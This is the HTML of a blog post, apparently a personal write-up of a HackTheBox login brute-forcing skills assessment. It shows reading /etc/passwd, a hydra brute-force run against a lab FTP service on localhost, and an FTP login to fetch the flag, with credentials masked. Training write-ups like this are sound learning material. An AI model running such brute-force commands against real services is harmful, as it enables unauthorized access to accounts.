@@ -1,0 +1,100 @@
+<!doctype html><html lang=en><head><title>HTB - Login Brute Forcing Module - Skills Assessment Part 2 · GeekyRyan</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="Ryan Nemeth"><meta name=description content="
+  HackTheBox Login Brute Force - Skills Assessment Part 2
+  
+    
+    Link to heading
+  
+
+This is part of a multi-part series documenting my process for completing the HackTheBox modules.
+This particular post will cover part 2 of the 2 part skills assessment.
+
+  What is the username of the ftp user you find via brute-forcing?
+  
+    
+    Link to heading
+  
+
+We can review /etc/passwd to see the ftp user."><meta name=keywords content="blog,developer,personal,devops"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB - Login Brute Forcing Module - Skills Assessment Part 2"><meta name=twitter:description content="HackTheBox Login Brute Force - Skills Assessment Part 2 Link to heading This is part of a multi-part series documenting my process for completing the HackTheBox modules.
+This particular post will cover part 2 of the 2 part skills assessment.
+What is the username of the ftp user you find via brute-forcing? Link to heading We can review /etc/passwd to see the ftp user."><meta property="og:url" content="https://rnemeth90.github.io/htb/2025-12-16-htb-brute-force-challenge01/"><meta property="og:site_name" content="GeekyRyan"><meta property="og:title" content="HTB - Login Brute Forcing Module - Skills Assessment Part 2"><meta property="og:description" content="HackTheBox Login Brute Force - Skills Assessment Part 2 Link to heading This is part of a multi-part series documenting my process for completing the HackTheBox modules.
+This particular post will cover part 2 of the 2 part skills assessment.
+What is the username of the ftp user you find via brute-forcing? Link to heading We can review /etc/passwd to see the ftp user."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="htb"><meta property="article:published_time" content="2025-12-16T16:01:00+00:00"><meta property="article:modified_time" content="2025-12-16T16:01:00+00:00"><link rel=canonical href=https://rnemeth90.github.io/htb/2025-12-16-htb-brute-force-challenge01/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.f8ac2fdd0cb7e56145845d949b5c036d40cd5061c013fd446f2f54a63ade62e8.css integrity="sha256-+Kwv3Qy35WFFhF2Um1wDbUDNUGHAE/1Eby9UpjreYug=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/svg+xml href=/images/favicon.svg sizes=any><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=https://rnemeth90.github.io/>GeekyRyan
+</a><input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/about/>About</a></li><li class=navigation-item><a class=navigation-link href=/posts/>Blog</a></li><li class=navigation-item><a class=navigation-link href=/til/>TIL</a></li><li class=navigation-item><a class=navigation-link href=/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/tags/>Tags</a></li><li class=navigation-item><a class=navigation-link href=/notes/>Notes</a></li><li class=navigation-item><a class=navigation-link href=/htb/>HTB</a></li></ul></section></nav><div class=content><section class="container page"><article><header><h1 class=title><a class=title-link href=https://rnemeth90.github.io/htb/2025-12-16-htb-brute-force-challenge01/>HTB - Login Brute Forcing Module - Skills Assessment Part 2</a></h1></header><h1 id=hackthebox-login-brute-force---skills-assessment-part-2>HackTheBox Login Brute Force - Skills Assessment Part 2
+<a class=heading-link href=#hackthebox-login-brute-force---skills-assessment-part-2><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h1><p>This is part of a multi-part series documenting my process for completing the HackTheBox modules.</p><p>This particular post will cover part 2 of the 2 part skills assessment.</p><h2 id=what-is-the-username-of-the-ftp-user-you-find-via-brute-forcing>What is the username of the ftp user you find via brute-forcing?
+<a class=heading-link href=#what-is-the-username-of-the-ftp-user-you-find-via-brute-forcing><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><p>We can review <code>/etc/passwd</code> to see the ftp user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>myuser@ng-2320105-loginbfsatwo-pep3o-698f9ff849-p4dwn:~$ cat /etc/passwd
+</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
+</span></span><span class=line><span class=cl>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class=line><span class=cl>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>gnats:x:41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>ftp:x:105:107:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>myuser:x:1000:1000::/home/myuser:/bin/bash
+</span></span><span class=line><span class=cl>&lt;***********&gt;:x:1001:1001::/var/.hidden:/bin/bash
+</span></span></code></pre></div><p>We then need to get the password for the ftp user (again, using a provided passwords file on the server just brute forced into).</p><p>We can use <code>hydra</code> again to brute force the ftp login.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>myuser@ng-2320105-loginbfsatwo-pep3o-698f9ff849-p4dwn:~$ hydra -l ******** -P passwords.txt -V localhost ftp
+</span></span><span class=line><span class=cl>Hydra v9.2 <span class=o>(</span>c<span class=o>)</span> <span class=m>2021</span> by van Hauser/THC <span class=p>&amp;</span> David Maciejak - Please <span class=k>do</span> not use in military or secret service organizations, or <span class=k>for</span> illegal purposes <span class=o>(</span>this is non-binding, these *** ignore laws and ethics anyway<span class=o>)</span>.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>https://github.com/vanhauser-thc/thc-hydra<span class=o>)</span> starting at 2025-12-16 03:39:39
+</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> max <span class=m>16</span> tasks per <span class=m>1</span> server, overall <span class=m>16</span> tasks, <span class=m>198</span> login tries <span class=o>(</span>l:1/p:198<span class=o>)</span>, ~13 tries per task
+</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> attacking ftp://localhost:21/
+</span></span><span class=line><span class=cl>......
+</span></span><span class=line><span class=cl><span class=o>[</span>ATTEMPT<span class=o>]</span> target localhost - login <span class=s2>&#34;********&#34;</span> - pass <span class=s2>&#34;dragon&#34;</span> - <span class=m>47</span> of <span class=m>198</span> <span class=o>[</span>child 4<span class=o>]</span> <span class=o>(</span>0/0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>ATTEMPT<span class=o>]</span> target localhost - login <span class=s2>&#34;********&#34;</span> - pass <span class=s2>&#34;1q2w3e4r&#34;</span> - <span class=m>48</span> of <span class=m>198</span> <span class=o>[</span>child 5<span class=o>]</span> <span class=o>(</span>0/0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>21<span class=o>][</span>ftp<span class=o>]</span> host: localhost   login: *******   password: ***********
+</span></span><span class=line><span class=cl><span class=m>1</span> of <span class=m>1</span> target successfully completed, <span class=m>1</span> valid password found
+</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>https://github.com/vanhauser-thc/thc-hydra<span class=o>)</span> finished at 2025-12-16 03:39:50
+</span></span></code></pre></div><h2 id=what-is-the-flag-contained-within-flagtxt>What is the flag contained within flag.txt
+<a class=heading-link href=#what-is-the-flag-contained-within-flagtxt><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><p>We can now login to ftp with the found credentials and get the flag.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>myuser@ng-2320105-loginbfsatwo-pep3o-698f9ff849-p4dwn:~$ ftp ********@localhost
+</span></span><span class=line><span class=cl>Trying <span class=o>[</span>::1<span class=o>]</span>:21 ...
+</span></span><span class=line><span class=cl>Connected to localhost.
+</span></span><span class=line><span class=cl><span class=m>220</span> <span class=o>(</span>vsFTPd 3.0.5<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=m>331</span> Please specify the password.
+</span></span><span class=line><span class=cl>Password:
+</span></span><span class=line><span class=cl><span class=m>230</span> Login successful.
+</span></span><span class=line><span class=cl>Remote system <span class=nb>type</span> is UNIX.
+</span></span><span class=line><span class=cl>Using binary mode to transfer files.
+</span></span><span class=line><span class=cl>ftp&gt; ls
+</span></span><span class=line><span class=cl><span class=m>229</span> Entering Extended Passive Mode <span class=o>(||</span><span class=p>|</span>39704<span class=p>|</span><span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=m>150</span> Here comes the directory listing.
+</span></span><span class=line><span class=cl>-rw-------    <span class=m>1</span> <span class=m>1001</span>     <span class=m>1001</span>           <span class=m>28</span> Sep <span class=m>10</span>  <span class=m>2024</span> flag.txt
+</span></span><span class=line><span class=cl><span class=m>226</span> Directory send OK.
+</span></span><span class=line><span class=cl>ftp&gt; get flag.txt
+</span></span><span class=line><span class=cl>local: flag.txt remote: flag.txt
+</span></span><span class=line><span class=cl><span class=m>229</span> Entering Extended Passive Mode <span class=o>(||</span><span class=p>|</span>47992<span class=p>|</span><span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=m>150</span> Opening BINARY mode data connection <span class=k>for</span> flag.txt <span class=o>(</span><span class=m>28</span> bytes<span class=o>)</span>.
+</span></span><span class=line><span class=cl>100% <span class=p>|</span>*******************************************************************************************************************<span class=p>|</span>    <span class=m>28</span>      719.57 KiB/s    00:00 ETA
+</span></span><span class=line><span class=cl><span class=m>226</span> Transfer complete.
+</span></span><span class=line><span class=cl><span class=m>28</span> bytes received in 00:00 <span class=o>(</span>239.85 KiB/s<span class=o>)</span>
+</span></span><span class=line><span class=cl>ftp&gt; <span class=nb>exit</span>
+</span></span><span class=line><span class=cl><span class=m>221</span> Goodbye.
+</span></span><span class=line><span class=cl>myuser@ng-2320105-loginbfsatwo-pep3o-698f9ff849-p4dwn:~$ cat flag.txt
+</span></span><span class=line><span class=cl>HTB<span class=o>{</span>************************<span class=o>}</span>myuser@ng-2320105-loginbfsatwo-pep3o-698f9ff849-p4dwn:~$ ^C
+</span></span><span class=line><span class=cl>myuser@ng-2320105-loginbfmyuser-pep3o-698f9ff849-p4dwn:~$ <span class=nb>exit</span>
+</span></span></code></pre></div><p>Done.</p></article></section></div><footer class=footer><section class=container>©
+2012 -
+2025
+Ryan Nemeth
+·
+Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>
